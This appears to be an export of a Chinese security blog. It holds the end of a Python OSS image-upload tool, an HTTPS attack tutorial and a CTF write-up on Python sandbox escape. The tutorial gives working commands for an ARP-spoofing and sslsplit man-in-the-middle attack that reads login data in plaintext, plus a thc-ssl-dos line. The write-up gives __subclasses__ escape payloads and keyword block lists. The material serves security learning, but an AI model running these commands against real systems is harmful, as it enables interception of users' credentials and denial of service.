<li><p>获取到图片以后判断是否为图片然后保存到本地</p>
</li>
<li><p>这里说明一点：PIL模块是处理图像的，使用PIL处理过图像以后是使图像变小，有利于进行云储存</p>
</li>
</ul>
<h3 id="将图片上传以后的生成的访问地址添加到粘贴板"><a href="#将图片上传以后的生成的访问地址添加到粘贴板" class="headerlink" title="将图片上传以后的生成的访问地址添加到粘贴板"></a>将图片上传以后的生成的访问地址添加到粘贴板</h3><ul>
<li><p>使用win32clipboard，win32con模块</p>
</li>
<li><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">setText</span><span class="params">(self,aString)</span>:</span></span><br><span class="line">        w.OpenClipboard()</span><br><span class="line">        w.EmptyClipboard()</span><br><span class="line">        w.SetClipboardData(win32con.CF_TEXT,aString)</span><br><span class="line">        w.CloseClipboard()</span><br></pre></td></tr></table></figure>
</li>
<li><p>这里存在一个坑：win32con.CF_TEXT这里在Python2中会将所有的字符串添加到粘贴板，早Python3中只会添加首个字符，解决办法：将CF_TEXT替换为CF_UNICODETEXT，如果在Python2中使用CF_UNICODETEXT会出现添加到粘贴板的字符是乱码</p>
</li>
</ul>
<h3 id="上传图片到OSS"><a href="#上传图片到OSS" class="headerlink" title="上传图片到OSS"></a>上传图片到OSS</h3><ul>
<li><p>使用oss2、shutil 模块，oss2是官方提供的Python OSS SDK，支持Python2、3</p>
</li>
<li><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">upload</span><span class="params">(self,file_name,name)</span>:</span></span><br><span class="line">        bucket = oss2.Bucket(oss2.Auth(self.acc_id,self.acc_secret),self.endpoint,self.bucket_name)</span><br><span class="line">        data = bucket.put_object_from_file(key=<span class="string">'Blog/'</span>+ name,filename=<span class="string">'image/'</span>+ name, headers=<span class="keyword">None</span>, progress_callback=<span class="keyword">None</span>)</span><br><span class="line">        str = <span class="string">"https://xxxxxx.xx/"</span> + name</span><br><span class="line"> </span><br><span class="line">          shutil.rmtree(<span class="string">'image'</span>)</span><br></pre></td></tr></table></figure>
</li>
<li><p>这里要在外部的 config文件中配置好阿里云提供的：Access Key ID、Access Key Secret、bucket_name、endpoint</p>
</li>
<li>说明：由于阿里云的SDK默认不支持文件夹，目录的概念，所以通过添加’/‘来表示在那个文件夹下；又由于没有返回文件访问连接地址的接口，所以通过固有的形式进行组合</li>
<li>shutil模块进行清空本地存放已经上传完的的图片（这样会删除文件夹，比遍历更加快速），这一点看个人了，可有可无，也可以使用os模块进行相应的操作。</li>
</ul>
<h3 id="设置阿里云OSS的接口信息"><a href="#设置阿里云OSS的接口信息" class="headerlink" title="设置阿里云OSS的接口信息"></a>设置阿里云OSS的接口信息</h3><ul>
<li><p>通过外部的config文件导入<img src="http://demos-qq.oss-cn-beijing.aliyuncs.com/18-3-27/76961318.jpg" alt></p>
</li>
<li><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">try</span>:</span><br><span class="line">        infoDict = &#123;&#125;</span><br><span class="line">        <span class="keyword">with</span> open(<span class="string">"config.conf"</span>,<span class="string">"r"</span>) <span class="keyword">as</span> file:</span><br><span class="line">            ApiInfo = file.readlines()</span><br><span class="line">            <span class="keyword">for</span> info <span class="keyword">in</span> ApiInfo:</span><br><span class="line">                <span class="keyword">try</span>:</span><br><span class="line">                    <span class="keyword">if</span> info != <span class="string">"\n"</span> <span class="keyword">and</span> info != <span class="string">""</span>:</span><br><span class="line">                        tmp = info.split(<span class="string">"="</span>)</span><br><span class="line">                        infoDict[tmp[<span class="number">0</span>].strip()] = tmp[<span class="number">1</span>].strip()</span><br><span class="line">                <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">                    <span class="keyword">print</span> <span class="string">u"[-] 请按照要求配置config.conf"</span></span><br><span class="line">                    sys.exit()</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">u"[-] 请在config.conf中配置阿里云 API信息"</span></span><br><span class="line">        sys.exit()</span><br></pre></td></tr></table></figure>
</li>
</ul>
<h3 id="结果示例"><a href="#结果示例" class="headerlink" title="结果示例"></a>结果示例</h3><ul>
<li><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1522318333.02.png" alt></li>
<li><img src="http://demos-qq.oss-cn-beijing.aliyuncs.com/18-3-27/38823279.jpg" alt></li>
</ul>
<h3 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h3><ul>
<li>[OSS SDK-Python]:<a href="https://github.com/aliyun/aliyun-oss-python-sdk" target="_blank" rel="noopener">https://github.com/aliyun/aliyun-oss-python-sdk</a></li>
</ul>
<h3 id="更新说明"><a href="#更新说明" class="headerlink" title="更新说明"></a>更新说明</h3><blockquote>
<p>现在已经修改可以支持python3的环境，详情请看github</p>
</blockquote>
]]></content>
      <categories>
        <category>python</category>
      </categories>
      <tags>
        <tag>python</tag>
        <tag>编程</tag>
        <tag>开发</tag>
      </tags>
  </entry>
  <entry>
    <title>HTTPS攻击</title>
    <url>/2018/06/13/HTTPS%E6%94%BB%E5%87%BB/</url>
    <content><![CDATA[<blockquote>
<p>在学习HTTPS攻击之前首先要了解为什么要进行全站HTTPS，全站HTTPS的应用会让链路中的流量加密传输，在HTTP协议明文传输时会发生链路劫持等情况，不论是黑客还是运营商劫持的难度较低，全站HTTPS的应用大大的提高了劫持的难度。在理论上所有的加密都是可以破解的，前提就是看你是否接受这个成本。目前全站HTTPS的应用已经很广泛了，如百度、淘宝等。</p>
</blockquote>
<h3 id="HTTPS及其相关知识"><a href="#HTTPS及其相关知识" class="headerlink" title="HTTPS及其相关知识"></a>HTTPS及其相关知识</h3><ul>
<li>HTTPS的作用<ul>
<li>CIA(信息安全三要素：机密性、完整性、可用性（HTTPS中是合法用户可以访问权限以内的资源）)</li>
<li>解决的是信息在传输过程中数据被篡改、窃取</li>
<li>加密：对称、非对称、单向</li>
</ul>
</li>
<li>HTTPS攻击方法<ul>
<li>降级攻击（HTTPS加密套件是多种加密方式，强制采用低强度的加密方式）</li>
<li>解密攻击（明文、证书伪造）</li>
<li>协议漏洞、实现方法的漏洞、配置不严格（漏洞来源的角度）</li>
</ul>
</li>
<li>SSL（全称Secure socket layer）<ul>
<li>保证网络通信安全的加密协议</li>
<li>TLS取代SSL v3(由于SSL协议漏洞使得大家认为其漏洞不可软件修复）<ul>
<li>Heartbleed</li>
<li>POODLE</li>
<li>BEAST</li>
</ul>
</li>
</ul>
</li>
<li>SSL/TLS用于其他场景的传输通道加密<ul>
<li>邮件传输（服务器间、客户端与服务期间）</li>
<li>数据库服务器间的通信</li>
<li>LDAP身份认证服务器间的通信</li>
<li>SSL VPN</li>
<li>远程桌面RDP通信过程中的加密和身份认证</li>
</ul>
</li>
<li>WEB通信中的SSL加密<ul>
<li>公钥证书（受信任的第三方证书颁发机构签名颁发）<img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1527423473.6.png" alt></li>
<li>Versign</li>
<li>Thawte</li>
<li>Globalsign</li>
<li>Symantec</li>
</ul>
</li>
<li>加密过程<ul>
<li>握手、协商加密算法、获取公钥证书、验证公钥证书、交换会话密钥、加密信息传输</li>
</ul>
</li>
<li>常见的加密算法<ul>
<li>非对称加密算法（适合加密少量的数据）<ul>
<li>Diffie-Hellman key exchange</li>
<li>RSA</li>
<li>ECC</li>
</ul>
</li>
<li>对称加密算法（适合加密大量的数据）<ul>
<li>DES / 3DES</li>
<li>AES （主流对称加密算法）</li>
<li>IDEA</li>
<li>RC4（生命周期短）<ul>
<li>WEP、TLS/SSL、RDP、secure shell</li>
</ul>
</li>
</ul>
</li>
<li>单向加密算法（hash）<ul>
<li>MD5</li>
<li>SHA-1  、 SHA-2</li>
</ul>
</li>
<li>SHA-2是TLS1.2唯一支持的单向加密算法</li>
<li>碰撞攻击针对单向加密算法（两个不同的文件生成相同的hash值）</li>
</ul>
</li>
<li>SSL的弱点<ul>
<li>SSL是不同的对称、非对称、单向加密算法的组合加密实现（加密套件）</li>
<li>服务器端为了提供更好的兼容性，选择支持大量过时的cipher suite</li>
<li>协商过程中强迫降级加密强度</li>
<li>现代处理器计算能力可以在可接受的时间内破解过时加密算法（使用云计算）</li>
</ul>
</li>
</ul>
<h3 id="HTTPS实践"><a href="#HTTPS实践" class="headerlink" title="HTTPS实践"></a>HTTPS实践</h3><h4 id="在实际中针对目标站点进行探测查看它使用的HTTPS的各种信息"><a href="#在实际中针对目标站点进行探测查看它使用的HTTPS的各种信息" class="headerlink" title="在实际中针对目标站点进行探测查看它使用的HTTPS的各种信息"></a>在实际中针对目标站点进行探测查看它使用的HTTPS的各种信息</h4><ul>
<li>openssl(用户层的一个操作系统命令，直接调用openssl库识别目标服务器支持的SSL/TLS cipher suite)</li>
<li>使用OpenSSL连接探测 <code>openssl s_client -connect www.baidu.com:443</code> <img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1527425145.38.png" alt><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1527425231.87.png" alt></li>
<li>探测目标站点是否支持不安全的加密套件 <code>openssl s_client -tls1_2 -cipher &#39;NULL,EXPORT,LOW,DES&#39; -connect www.baidu.com:443</code><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1527426134.54.png" alt></li>
<li>通过OpenSSL查看不安全的加密套件 <code>openssl ciphers -v &#39;NULL,EXPORT,LOW,DES&#39;</code> <img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1527426259.37.png" alt></li>
<li>使用SSLScan识别<ul>
<li>自动识别SSL配置错误、过期协议、过时cipher suite和hash算法</li>
<li>默认检测CRIME、heartbleed漏洞</li>
<li>测试支持TLS_1.2: <code>sslscan --tlsall www.taobao.com:443</code><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1527426631.26.png" alt></li>
<li>分析证书的详细信息 <code>sslscan --show-certificate --no-ciphersuites www.taobao.com:443</code><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1527426784.44.png" alt><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1527426802.79.png" alt></li>
</ul>
</li>
<li>SSLyze探测<ul>
<li>Python编写</li>
<li>检测SSL过时版本、存在弱点的cipher suite、是否支持会话恢复</li>
<li><code>sslyze --regular www.taobao.com</code>   进行信息的探测<img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1527427068.09.png" alt></li>
</ul>
</li>
<li>nmap脚本探测： <code>sudo nmap --script=ssl-enum-ciphers.nse www.taobao.com</code></li>
<li>第三方网站扫描： <code>www.ssllabs.com/ssltest</code></li>
</ul>
<h3 id="实际攻击的一些方法"><a href="#实际攻击的一些方法" class="headerlink" title="实际攻击的一些方法"></a>实际攻击的一些方法</h3><p>SSL/TLS中间人攻击（攻击者位于客户端和服务器通信链路中，中间人伪造证书进行加解密进行流量劫持）</p>
<blockquote>
<p>这里举个例子，在我们使用代理工具的时候会在浏览器上面设置代理，但在真正的生产环境中我们是不可能将目标的浏览器代理设置为我们的地址，所以就要用到以下的方法</p>
</blockquote>
<ul>
<li><p>ARP欺骗（最常用的中间人攻击方式）</p>
</li>
<li><p>DHCP（四步过程中的第一步一定是广播，谁先相应先给谁确认）</p>
</li>
<li><p>修改网关（手动修改，理论上成立，在现实环境中很难实现）</p>
</li>
<li><p>修改DNS</p>
</li>
<li><p>修改HOSTS（手动修改的这几个在生产环境中实现的条件非常苛刻）</p>
</li>
<li><p>ICMP、STP（交换树协议，避免逻辑环路，实现高可用）、OSPF（攻击者和被攻击者出于同一个局域网可以通过攻击一些网络协议）</p>
</li>
<li><p>通过伪造CA证书实现SSL中间人攻击的原理图：<img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1527511235.02.png" alt></p>
</li>
<li><p>实现SSL中间人攻击的前提（如果SSL中间人攻击以后客户端不提示一些告警信息，用户是很难发现被攻击的）</p>
<ul>
<li>客户端已经信任伪造证书颁发机构</li>
<li>攻击者控制了合法的证书颁发机构</li>
<li>客户端程序禁止了显示证书错误告警信息</li>
<li>攻击者已经控制客户端，并强制其信任伪造证书</li>
</ul>
</li>
<li><p>SSLsplit（只需要在攻击者的机器上配置好以后就可以实现对经过的流量解密，也称为HTTPS降级攻击）</p>
<ul>
<li><p>透明的SSL/TLS中间人攻击工具</p>
</li>
<li><p>对客户端伪装成服务器，对服务器伪装成普通客户端</p>
</li>
<li><p>伪装服务器需要伪造证书（这里就需要在本地生成一张伪造证书）</p>
</li>
<li><p>支持SSL/TLS加密的SMTP、POP3、FTP等通信中间人攻击（不仅限于https解密）</p>
</li>
<li><p>攻击原理：</p>
<blockquote>
<p>监听https流量，更改重定向连接中的location，替换https为http并记录；更改响应内容中的超链接，替换https为http并记录；与用户进行http通信、与服务器进行https通信（记录中本应该是https的请求），从而获取用户信息。</p>
</blockquote>
<p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1527512349.78.png" alt></p>
</li>
</ul>
</li>
<li><p>使用openssl伪造中间人的证书：</p>
<ul>
<li>使用OpenSSL生成证书私钥：<code>openssl genrsa -out ca.key 2048</code>  现在主要使用的就是2048或4096位<img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1527512630.43.png" alt></li>
<li>利用私钥签名生成证书： <code>openssl req -new -x509 -days 1096 -key ca.key -out ca.crt</code> （这个证书就是伪造的中间人的根证书，伪造信息的时候仅可能的真实）<img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1527512950.23.png" alt></li>
<li>这里生成的根证书会被sslsplit调用生成通信的证书</li>
</ul>
</li>
<li><p>开启中间人机器的路由功能（实现真正的路由转发，相当于一个路由器）</p>
<p> <code>sudo sysctl -w net.ipv4.ip_forward=1</code></p>
<p>  修改的文件在 <code>/proc/sys/net/ipv4/ip_forward</code></p>
</li>
<li><p>配置iptables规则实现端口转发调用证书：（因为sslsplit工作在特定的端口上）</p>
<ul>
<li><p>查看80、443端口是否被占用 <code>netstat -pantu | grep 80</code>    <code></code>netstat -pantu | grep 443`</p>
</li>
<li><p>查看当前防火墙中的nat规则 <code>sudo iptables -t nat -L</code><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1527513961.96.png" alt></p>
</li>
<li><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">80端口重定向到8080端口</span><br><span class="line">sudo iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-ports 8080</span><br><span class="line">443端口重定向到8443端口</span><br><span class="line">sudo iptables -t nat -A PREROUTING -p tcp --dport 443 -j REDIRECT --to-ports 8443</span><br><span class="line">将邮件提交代理（MSA）、SMTPS、IMAPS、POP3S重定向到8443端口(可以将加密的流量都转发)</span><br><span class="line">sudo iptables -t nat -A PREROUTING -p tcp --dport 465 -j REDIRECT --to-ports 8443</span><br><span class="line">sudo iptables -t nat -A PREROUTING -p tcp --dport 587 -j REDIRECT --to-ports 8443</span><br><span class="line">sudo iptables -t nat -A PREROUTING -p tcp --dport 993 -j REDIRECT --to-ports 8443</span><br><span class="line">sudo iptables -t nat -A PREROUTING -p tcp --dport 995 -j REDIRECT --to-ports 8443</span><br></pre></td></tr></table></figure>
</li>
</ul>
</li>
<li><p>使用一台WIN7的虚拟机进行arp欺骗： <code>sudo arpspoof -i ens33 -t 192.168.240.131 -r 192.168.240.2</code> <img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1527514767.14.png" alt><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1527514837.89.png" alt><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1527515026.14.png" alt></p>
</li>
<li><p>查看win7的Mac地址发现已经被欺骗<img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1527515119.57.png" alt></p>
</li>
<li><p>开启sslsplit监听端口（sslsplit的作用是调用伪造证书服务器根证书(ca.crt)针对不同网站签发不同的证书，比如：针对百度伪造类似百度的证书，针对淘宝伪造类似淘宝的证书 ）</p>
<ul>
<li>建立一个数据存放目录： <code>mkdir -p test1/logdir</code></li>
<li><code>sudo sslsplit -D -l connect.log -j /home/toml/test1/ -S logdir -k ca.key -c ca.crt ssl 0.0.0.0 8443 tcp 0.0.0.0 8080</code>   可以看到生成证书的内容<img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1527516265.08.png" alt></li>
</ul>
</li>
<li><p>当被劫持的客户端访问一些做了https的网站，比如淘宝，客户端输入的一些数据经过sslsplit就会被降级解密，理论上是这样，但是现在出现一个尴尬的情况：开启流量转发后arp欺骗也成功了，结果客户端不能正常访问页面。通过分析是https降级失败。</p>
</li>
<li><p>重新进行了https降级，客户端访问页面出现证书不受信任的警告：<img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1527574568.92.png" alt></p>
</li>
<li><p>在客户端访问做了全站https的淘宝并模拟登陆：（并在logdir目录下查看传输数据的记录）<img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1527574721.05.png" alt></p>
</li>
<li><p>匹配输入账号密码的字符 <code>sudo grep 123123 *</code>  并查看文件，发现数据都可以明文查看到<img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1527575040.21.png" alt><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1527575164.97.png" alt></p>
</li>
<li><p>HTTPS结合伪造证书降级攻击成功，如果是在真实环境中，为了完美的攻击，可以将伪造的根证书传到客户端浏览器上，这样客户端就不会提示告警信息了。</p>
</li>
</ul>
<h3 id="SSL-TLS拒绝服务攻击"><a href="#SSL-TLS拒绝服务攻击" class="headerlink" title="SSL/TLS拒绝服务攻击"></a>SSL/TLS拒绝服务攻击</h3><blockquote>
<p>由于SSL在正式加密通信之前，会进行一个协商的机制，协商使用哪种加密套件等，协商成功以后建立SSL的通信，在这个过程中会产生大量的连接，在一定程度上https对会增大服务器的开销。</p>
</blockquote>
<ul>
<li>thc-ssl-dos（一个ssl dos工具，利用的SSL的安全重连接的特性，打死的不是带宽，而是服务器的资源，产生的流量很小，但是效果却很好）<ul>
<li>SSL协商加密对性能开销增大，大量握手请求会造成拒绝服务</li>
<li>利用SSL secure Renegotiation特性，<strong>在单一TCP连接中生成数千个SSL连接请求</strong>，造成服务器资源过载</li>
<li>与流量式拒绝服务(占用所有的带宽)攻击不同，thc-ssl-dos可以利用dsl线路打垮30G带宽的服务器</li>
<li>服务器平均可以处理300次/秒SSL握手请求</li>
<li>对SMTPS、POP3S等服务同样有效</li>
<li>thc-ssl-dos 199.233.209.205 2083 –accept</li>
</ul>
</li>
<li>对策<ul>
<li>禁用SSL-Renegotiation、使用SSL Accelerator</li>
<li>测试网站是否禁用了SSL-Renegotiation <code>openssl s_client -connect</code></li>
<li>通过修改thc-ssl-dos代码，可以绕过以上对策</li>
</ul>
</li>
</ul>
<h3 id="web其他知识点补充"><a href="#web其他知识点补充" class="headerlink" title="web其他知识点补充"></a>web其他知识点补充</h3><ul>
<li>AJAX<ul>
<li>Asynchronous JavaScript and XML</li>
<li>是一个概念，而非一种新的编程语言，是一组现有技术的组合</li>
<li>通过客户端脚本动态更新页面部分内容，而非整个页面</li>
<li>降低带宽使用，提高速度</li>
<li>提升用户体验</li>
<li>后台异步访问</li>
</ul>
</li>
<li>AJAX组件<ul>
<li>JavaScript：ajax的核心组件，使用XMLHTTPRequest对象接口像服务器发起请求，接收并处理服务器响应数据</li>
</ul>
</li>
<li>DHTML<ul>
<li>早于AJAX出现，通过JavaScript、css等在客户端修改HTML页面element，缺点是完全依赖于客户端代码修改页面，与服务器的交互由JavaScript applets完成，AJAX的XHR弥补了它的缺点（注册用户）</li>
</ul>
</li>
<li>DOM<ul>
<li>处理html、xml文档对象的框架，DHTML是一个浏览器，DOM作为其一个实现的接口，定义和管理每个页面元素obj的properties、method、event</li>
</ul>
</li>
<li>基于AJAX的WEB应用工作流程<ul>
<li>XMLHTTPRequest API创建对象xmlhttp进行访问</li>
<li>xml、json、HTML、文本、图片</li>
<li>多个异步请求独立通信，互不依赖</li>
<li>AJAX框架<ul>
<li>JQuery</li>
<li>Dojo Toolkit</li>
<li>Google web tookit(GWT)</li>
<li>microsoft AJAX library</li>
</ul>
</li>
</ul>
</li>
<li>AJAX攻击面不为大多数人所知</li>
<li>AJAX的安全问题<ul>
<li>多种技术混合，增加了攻击面，每个参数都可能形成独立的攻击过程</li>
<li>AJAX引擎是个权功能的解释器，访问恶意站点可能后果严重，虽然浏览器有沙箱和SOP，但可被绕过</li>
<li>服务器、客户端代码结合使用产生混乱，服务器访问控制不当，将信息泄露</li>
<li>暴露应用程序逻辑</li>
</ul>
</li>
<li>AJAX对渗透测试的挑战<ul>
<li>异步请求数量多且隐蔽</li>
<li>触发AJAX请求的条件无规律</li>
<li>手动和截断代理爬网可能产生大量遗漏</li>
</ul>
</li>
<li>AJAX爬网工具<ul>
<li>OWASP_ZAP（在攻击模块中）</li>
</ul>
</li>
<li>客户端代码审计<ul>
<li>源码</li>
<li>firebug  / f12 中的XHR</li>
</ul>
</li>
<li>WEB SERVICE<ul>
<li>面向服务的架构，便于不同系统集成共享数据和功能</li>
<li>尤其适合不想暴露数据模和程序逻辑而访问数据的场景</li>
<li>无页面</li>
</ul>
</li>
<li>两种类型的WEB service<ul>
<li>SOAP<ul>
<li>传统的web service 开发方法，xml是唯一的数据交换格式</li>
<li>要求安全性的应用更多采用</li>
</ul>
</li>
<li>RESTFUL<ul>
<li>更多被采用的轻量web service,JSON是数据交换格式</li>
</ul>
</li>
</ul>
</li>
<li>WEB service安全考虑<ul>
<li>使用的api key或session token实现和跟踪身份认证</li>
<li>身份认证有服务器完成，而非客户端</li>
<li>API key、用户名、session token永远不要通过URL发送</li>
<li>RESTful默认不提供任何安全机制，需要使用SSL/TLS保护传输数据安全</li>
<li>SOPA提供提供强于HTTPS的WS-security机制（在传输层实现数据加密）</li>
<li>使用OAuth 或 HMAX进行身份验证，HMAX身份认证使用C/S共享密钥加密API KEY</li>
<li>RESTful应只允许身份认证用户使用PUT、DELETE方法</li>
<li>使用随机token防止CSRF攻击</li>
<li>对用户提交参数过滤，建议部署基于严格白名单的方法</li>
<li>报错信息消毒</li>
<li>直接对象引用应严格身份验证（电商公司已ID作为主索引）</li>
</ul>
</li>
</ul>
]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>安全</tag>
        <tag>parrot</tag>
        <tag>渗透测试</tag>
      </tags>
  </entry>
  <entry>
    <title>python沙盒逃逸学习</title>
    <url>/2018/06/11/python%E6%B2%99%E7%9B%92%E9%80%83%E9%80%B8/</url>
    <content><![CDATA[<blockquote>
<p>由于在现在的比赛中出现了沙盒逃逸这种题目，所以就针对python沙盒逃逸学习记录如下。python沙盒逃逸的思路就是题目删除了一些不安全的内建函数，模块导致环境的权限被降低，要利用python语言的特性进行限制的绕过。同时借助前几天赛中的沙盒逃逸演示一下。比赛中涉及的到Python沙盒逃逸往往是利用语言特性来逃逸，但是其实这只是从Python解释器的逃逸，从严格意义上说这是不完全的。从现实意义上来讲更进一步的是利用沙盒的逃逸来控制整个系统，Python的模块通常都是大量C代码的封装，这里面就有未被发现的内存破坏漏洞。所以比赛的题目只是一种思路，更多的还是要结合到实际生产环境中。</p>
</blockquote>
<h4 id="实例一"><a href="#实例一" class="headerlink" title="实例一"></a>实例一</h4><ol>
<li><p>实验脚本：题目的设置，删除一些内建函数（Python语言加载的时候会自动加载系统的内建模块，python2中是builtin，Python3中是builtins）</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">make_secure</span><span class="params">()</span>:</span></span><br><span class="line">    UNSAFE = [<span class="string">'open'</span>,<span class="string">'file'</span>,<span class="string">'execfile'</span>,<span class="string">'compile'</span>,<span class="string">'reload'</span>,<span class="string">'__import__'</span>,<span class="string">'eval'</span>,<span class="string">'input'</span>]</span><br><span class="line">    <span class="keyword">for</span> func <span class="keyword">in</span> UNSAFE:</span><br><span class="line">        <span class="keyword">del</span> __builtins__.__dict__[func]</span><br><span class="line"> </span><br><span class="line"><span class="keyword">from</span> re <span class="keyword">import</span> findall</span><br><span class="line"> </span><br><span class="line"><span class="comment">#Remove dangerous builtins</span></span><br><span class="line">make_secure()</span><br><span class="line"><span class="keyword">print</span> <span class="string">'Go Ahead,Expoit me &gt; ;D'</span></span><br><span class="line"><span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">"&gt;&gt;&gt;"</span>,</span><br><span class="line">        <span class="comment">#Read user input until the first whitespace character</span></span><br><span class="line">        inp = findall(<span class="string">'\S+'</span>,raw_input())[<span class="number">0</span>]</span><br><span class="line">        a = <span class="keyword">None</span></span><br><span class="line">        <span class="comment">#Set a to the result from executing the user input</span></span><br><span class="line">        <span class="keyword">exec</span> <span class="string">'a='</span>+inp</span><br><span class="line">        <span class="keyword">print</span> <span class="string">'&gt;&gt;&gt;'</span>,a</span><br><span class="line">    <span class="keyword">except</span> Exception, e:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">'Exception:'</span>,e</span><br><span class="line"><span class="comment">#后面这一段主要是将结果以字符串的形式操作并显示</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>脚本运行结果：（环境的限制权限非常低）这里其实就是模拟Python的命令行界面，然后进行相应的操作，只是将一些内建函数删除了，所以无法调用系统命令等等<img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1525428212.69.png" alt></p>
</li>
<li><p>正常情况下Python的使用可以调用OS等模块，就可以进行系统命令的调用和文件操作等等：但是经过限制以后的环境就不可以调用了，因此不能调用系统命令拿到flag<img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1525428524.0.png" alt><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1525428600.48.png" alt></p>
</li>
<li><p>由于删除了对应的内建函数，所以我们要利用Python的特性来绕过这种限制：<strong>Python中可以利用file来read文件</strong> 但是我们可以发现直接用file这种方式也是被限制了的，所以利用对象的概念，通过元组来加载：（有一个知识点：<strong>bases</strong> : 类的所有父类构成元素（包含了一个由所有父类组成的元组））<img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1525429208.95.png" alt></p>
</li>
<li><p>通过将所有父类组成的元组显示出来以后可以找到file在第40个，然后我们可以通过硬编码的方式调用file加载文件找到flag： <code>().__class__.__bases__[0].__subclasses__()[40](&#39;./flag.txt&#39;).read()</code><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1525429504.92.png" alt></p>
</li>
</ol>
<h3 id="实例二"><a href="#实例二" class="headerlink" title="实例二"></a>实例二</h3><ol>
<li><p>首先还是贴上环境的脚本，前提条件和实例一差不多：（不同的是这里能够执行的内建函数只有输入输出，与实例一不同的还有就是这里不回显数据  ）</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">"Welcome to my python sandbox! Enter commands below!"</span></span><br><span class="line"> </span><br><span class="line">banned = [<span class="string">'import'</span>,<span class="string">'exec'</span>,<span class="string">'eval'</span>,<span class="string">'pickle'</span>,<span class="string">'os'</span>,<span class="string">'subprocess'</span>,<span class="string">'kevin sucks'</span>,<span class="string">'input'</span>,<span class="string">'banned'</span>,<span class="string">'cry sum more'</span>,<span class="string">'sys'</span>]</span><br><span class="line"> </span><br><span class="line">targets = __builtins__.__dict__.keys()</span><br><span class="line">targets.remove(<span class="string">'raw_input'</span>)</span><br><span class="line">targets.remove(<span class="string">'print'</span>)</span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> targets:</span><br><span class="line">    <span class="keyword">del</span> __builtins__.__dict__[x]</span><br><span class="line"> </span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">"&gt;&gt;&gt;"</span>,</span><br><span class="line">        data = raw_input()</span><br><span class="line">        <span class="keyword">for</span> no <span class="keyword">in</span> banned:</span><br><span class="line">            <span class="keyword">if</span> no.lower() <span class="keyword">in</span> data.lower():</span><br><span class="line">                <span class="comment">#将输入的字符转换为小写和banned中的字符转换为小写比较</span></span><br><span class="line">                print(<span class="string">"Permission Denied"</span>)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">exec</span> data</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">''</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>环境运行结果如下：<img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1525440081.27.png" alt></p>
</li>
<li><p>思路与实例一还是一样，都是使用所有父类组成的元组，这里要使用到catch_warnings类（索引在59），进行命令执行 <code>print ().__class__.__bases__[0].__subclasses__()</code>    <code></code><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1525440331.12.png" alt></p>
<p><code>().__class__.__bases__[0].__subclasses__()[59].__init__.func_globals[&#39;linecache&#39;].__dict__[&#39;o&#39;+&#39;s&#39;].__dict__[&#39;sy&#39;+&#39;stem&#39;](&#39;ls&#39;)</code><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1525440491.92.png" alt></p>
</li>
<li><p>经过测试以后发现这里其实可以不用执行59的那个子类，因为没有禁用print函数，当然这里的59这个子类可以用到实例一中进行ls的调用</p>
